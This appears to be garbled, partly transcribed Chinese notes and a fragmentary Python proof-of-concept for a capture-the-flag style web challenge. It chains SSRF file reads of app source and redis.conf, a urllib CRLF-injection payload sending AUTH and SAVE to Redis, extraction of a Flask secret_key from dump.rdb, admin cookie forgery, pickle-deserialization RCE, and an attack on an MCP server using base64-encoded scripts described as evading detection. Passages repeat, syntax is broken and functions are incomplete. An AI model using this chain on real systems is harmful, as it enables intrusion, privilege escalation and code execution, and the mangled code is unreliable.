#注册新用户
data = {
'username'
'password'
'confirm'
'name'
'age'
'phone'
}
print( 注册用户: {usermore}
response = requests.post

if code == 200:
注册成功
else:
失败
False.
200

def login(username, password):
登陆用户并返回session

def exploit_ssrf_file_read(session, file_path):
"利用SSRF漏洞读取文件(使用file协议)
注: 由响应通过base64 img 标显示, 需要响应中提base64
数 解码"
file: ///proc/self/cmdline
environ
获取目录/app, 运行app.py文件 Python 3.7.3,
读取app.py文件
对app.py做代码审计, 使用: flash 框架

1. 2个admin路由, secret_key 保存到了redis. 思路: SSRF 读写 redis(数据).
∵ python 3.7.3, 有一个历漏洞: urllib存在CRLF注入漏洞, 利用该漏洞
去访问redis

2. redis有密码, 配文件: opt/app_config/redis-config.json, 但配置
文件被删除了。但还可读redis的自己 文件。redis常 配文 路径:
/etc/redis/redis.conf

读取到redis密码: redispass123

Redis 读数据

访问redis, 可访问, 但报错: get 请求头.
∴ 通过SSRF去访问redis是无回显的
还有一种获redis数据库内容的方法
use redis的save命令, 把redis数据库保存到文件里, 再通过ssrf
的file协议去读取.
大 步骤为
http://localhost:6379/%0d%0aAUTH%20redispass123%0d%0aSAVE
%0d%0apadding
保存的默认路径: /var/lib/redis/dump.rdb
↓
再通 SSRF去读取, 拿到 secret_key
↓
利用 ①, 就可伪造admin账号的cookie了, 可访问admin路由;

python - pickle 反序列 单词说过

路由 /admin/online-users 在线用户: 发现是读取redis数据库
/admin:2个 /users 的数据, 存储时
使用了 RestrictedUnpickler来
反序列化

coding: # 获取所有在线用户键

① online_keys = r.keys('online-user:*')
if not ②
return 'no 在线用户'.
users_html = '在 用户列表<table border="1",
style="border-
collaps"
t= '  用户名  角色 鉴
权 地
步骤为
http://localhost:6379/%0d%0aAUTH%20redispass123%0d%0aSAVE
%0d%0apadding
保存的默认路径: /var/lib/redis/dump.rdb
↓
再通 SSRF去读取, 拿到 secret_key
↓
利用 ①, 就可伪造admin账号的cookie了, 可访问admin路由;

python - pickle 反序列 单词说过

路由 /admin/online-users 在线用户: 发现是读取redis数据库
/admin:2个 /users 的数据, 存储时
使用了 RestrictedUnpickler来
反序列化

coding: # 获取所有在线用户键

① online_keys = r.keys('online-user:*')
if not ②
return 'no 在线用户'.
users_html = '在 用户列表<table border="1",
style="border-
collaps"
t= '  用户名  角色 鉴
权 地
for key in online_keys:
try:
serialized = r.get(key)
if serialized:
file = io.BytesIO(serialized)
unpickler = RestrictedUnpickler(file)
online_user = unpickler.load()

expiry_time = datetime.datetime.strptime(online_user.expiry_
current_time = datetime.datetime.now()
status = '在线' if current_time < expiry_time else '已过期'

② 查看 Restricted
攻击步骤: ① 注册普通用户
② 利用关URL下载功能 的SSRF漏洞, 使用file协议
读取 /etc/redis/redis.conf
③ 从redis.conf 提取Redis配置(密码. 主机 端口)
④ 利用 urllib 头注入漏洞, 注入Redis协议命令
读取 app: secret_key
⑤ 使用 flask-session-cookie-manager 伪造 admin
用户的 session cookie
⑥ 伪造的cookie 访问 /admin/users 路由获取all
use
用户信息

import {
requests
re
json
base64
sys os time subprocess
}

from urllib.parse import quote, urlencode

目标URL

BASE_URL = " http:// loca ho : 5000"
proxies= { 'http':'http://127.0.0.1:8080' }
proxies = { }
def register_user ( username, password ):
使用file协议读文件
从响应中提base64数据
查找 data:image/png;base64 类似的格式
↓
if match :
try: # 解码base64数据
except:
print
# 尝other方法: 响应中查找文件的
文体本

def extract_file_content_from_response(html_content):
从html响应中提取内容

查找可能包含文件 内容

img标签
pre 标签中的内容
Base 64 编码

for patter in s
if match
prn  时间
return content
# 加 该. 返 整个响应
re html_content [:1000].
def parse_redis_config(config_content):
从redis.conf中解析Redis配置.

config={
password
host
port: 6379
}

bres = config_content.split('\n')
for line.
{
if startswith('#') or not line  continue
if 'requirepass' in line.
找到 Redis 密码
elif line.startswith('bind')
找到 Redis 绑定地址
elif line.startswith('port')
找到Redis端口
if  2
try:
找到Redis端口
}
return config.
def exploit_save_and_read_dump(session, redis_config):
使用SAVE命令创建Redis备份, 通过SSRF下读dump.rdb文件
来提取 secret_key.

① 获 Redis 密码
↓
第一步: 执行SAVE命令创建dump.rdb文件
save_payload=
data
headers.
try: response.

第二步: 读 dump.rdb 文件
① 先从 Redis 配 中get dir 和 dbfilename.
#默认路径: /var/lib/redis/dump.rdb

dump_path

print

使 现用SSRF文件读功能.

dump_content
if not dump_content
# 尝 试 可能路径.
for alt_path in alt_paths:
if not dump_content
print( 成功读取dump文件
大小

#第三步: 从dump文件中提取 secret_key.

RDB文件二进制, 但可拉 字符串

app: secret_key 值 应以  形式 存有

↓
print( dump文件中 找

转换为 bytes 以便search

if
else

dump文件中 search 可能的 secret_key 格式

secret_key 可能base64 、hex 编码 字符串

尝 去找 app:secret_key 分

RDB文件中, 部分 可以字符串格式 存似

#.
字符串,
def trigger_deserialization(session, cookie):
访问/admin/online-users 路由触发反序列化

def read_rce_result(session, result_file="/tmp/rce_result.t
t"):
通过SSRF读命令执行结果文件

def exploit_pickle_rce(session, redis_config, cookie, command
="id");
完整 pickle RCE 利用 链:
① 执行 id > /tmp/output
② 触发反序列
③ 读取命令执行结果

#将  作为输出文件, 匹配 洞 手 成 功了的
result_file.
注 把后面的出

过 {
这 两 等 RDB文件解 → 简单
查个dump 内 字符串返回
}
else : # 返回dump 内 容 进一步分析

def forge_flash_session(secret_key. username="admin"
伪造 Flash session cookie

try { ① env → Flash 生成cookie
}

def access_admin_users ( cookie):
使用伪造的cookie 访问 /admin/users 路由

headers=
try.,



# 用户提供的成功payload (从decode_payload.py文件)
USER_PAYLOAD=
# 步骤 1: 构造Payload
# 2. 发送到Redis
# 3. 触发反序列化
# 4. 读result

def attack_mcp_server(session, redis_config, forged_cookie):
    # 攻击安全mcp服务器 通过命令写入利用脚本并执行
    # 步骤：
    # 1. 通过 RCE写入利用 MCP 用的 python 脚本到/tmp
    # 2. 修改脚本，调用 MCP 的 execute_command 方法执行
    # 3. 读取攻击结果


#步骤2: 登录用户:
session = login(username,password)
if not session:
    print("[-]登录失败,退出")
    return

#步骤3: 利用SSRF读取Redis 配置文件
print("利用SSRF漏洞读取/etc/redis/redis.conf")
redis_conf = exploit_ssrf_file_read(session, "/etc/redis/redis.conf")
if redis_conf:
    print(redis_conf[:500])
    if len(redis_conf) > 500:
        print("截断")
    else:
        print("无法读取Redis配置,使用默认配置.")

redis_conf = "requirepass redispass123\nbind 0.0.0.0\nport 6379"

#步骤4: 解析 Redis 配置
print()
redis_config = parse_redis_config(redis_conf)

#步骤5:使用SAVE命令创建dump文件并通过SSRF读取 secret_key
print("步5")
dump_content = exploit_save_and_read_dump(session, redis_config)
if dump_content:
    #尝试从dump内容中提取 secret_key
    print()
    #初始化 secret_key 为 None
    secret_key = None
    #将内容转换为bytes 以便search
    if isinstance(dump_content, str):
        dump_bytes = dump_content.encode('utf-8', errors='ignore')
    else:
        dump_bytes = dump_content
    #在dump中 搜索 可能的secret_key
    # 64字符的十六进制字符串
    import re
    import base64
    #首先search
    hex_pattern
    hex_matches
    if :
        print("在dump中找到 ? 个可能的 hex 字符串")
        #选择第一个64字符的 hex 字符串

for match in hex_matches[:5]: #只取前5个
    secret_key = match.decode('utf-8')
    print("找到 hex")
    print("长度: len()")

#如果没找到, 尝试查找 app:secret_key 键名及值
#RDB文件中键值对存储格式为文本, 查找字符串
if not secret_key and b'app:secret_key' in dump_bytes:
    print(f"[+] 找到'app:secret_key'键")
    #查找键后面的内容
    idx = dump_bytes.find(b'app:secret_key')
    if idx != -1:
        #提取键后面的 100 字节
        after_key = dump_bytes[idx+len(b'app:secret_key'):idx+len(b'app:secret_key')+100]
        print()
        #键后原始字节
        #尝试找 64字符hex 字符串
        hex_match = re.search(rb'([0-9a-fA-F]{64})', after_key)
        if hex_match:
            secret_key = hex_match.group(0).decode('utf-8')
            print("从键后提取到secret_key")
        else:
            #尝试提取 可见字符
            visible
            print("键后可见字符")

#尝试base64模式作为备用
base64_pattern
match = re.search( , after_key)
if match:
    secret_key = match.group(0).decode('utf-8')
    print("提取到可能的secret_key (base64):", secret_key[:30])

if not secret_key:
    print("无法从dump中获取,使用默认值.")
    secret_key = "default_secret_key"
else:
    print("无法通过 SAVE+SSRF 获取dump文件")

#步6: 伪造 admin 用户的session cookie
print()
forged_cookie = forge_flash_session(secret_key, "admin")
if not forged_cookie:
    print("[-] 无法伪造, 退出")
    return

#步7: 使用伪造的cookie 访问/admin/users
print()
admin_response = access_admin_users(forged_cookie)
if admin_response:
    print("攻击成功! 成功获取admin权限并访问受保护路由")
else:
    print("攻击失败,无法访问当前页面.")

#步8: Pickle RCE命令执行
if session and redis_config:
    #示例
    exploit_pickle_rce(session, redis_config, forged_cookie, "ps -ef > /tmp/output")
else:
    print("缺少 session/redis_config, 跳过RCE")

#步9: 攻击安全MCP服务器
if session and forged_cookie:
    print("尝试破解MCP服务器 token, 并执行root权限命令")
    #注: 需先确保RCE 或读取了MCP 服务配置
    attack_mcp_server(session, redis_config, forged_cookie)
else:
    print("缺少 session/伪造 cookie, 跳过MCP攻击")
print("脚本执行over!")

if __name__ == "__main__":
    main()


def main():
    print("""
    SSRF + Flash Session Cookie 伪造攻击POC
    目标: 获取admin 权限并访问/admin/user
    """)
    #步骤1: 注册普通用户
    username
    password = "AttackPass123"

#验证脚本是否写入成功
#步2: 执行攻击脚本
execute_cmd
exploit_pickle_rce(session, redis_config, cookie, execute_cmd)
#等待执行完成
time.sleep(3)
#步3: 读取攻击结果
#尝试读取结果文件
result_file = '/tmp/mcp_attack_result.txt'
result = read_rce_result(session, result_file)
print("攻击完成")


def attack_mcp():
    mcp = {
        "host": "",
        "port": "",
        "url": "",
        "any": "glob"
    }

#if __name__ == '__main__':
#    attack_mcp()

#将脚本写入文件
script_file = "/tmp/mcp_attack.py"
_base64_file = "_base64.py"

#将脚本进行 base64 编码
import base64
script_b64

# 使用b64编码后写入文件 [免杀字符处理]
write_cmd1
cmd2:
exploit_pickle_rce(session, redis_config, forged_cookie, write_cmd)
#等待写入完成
time.sleep(2)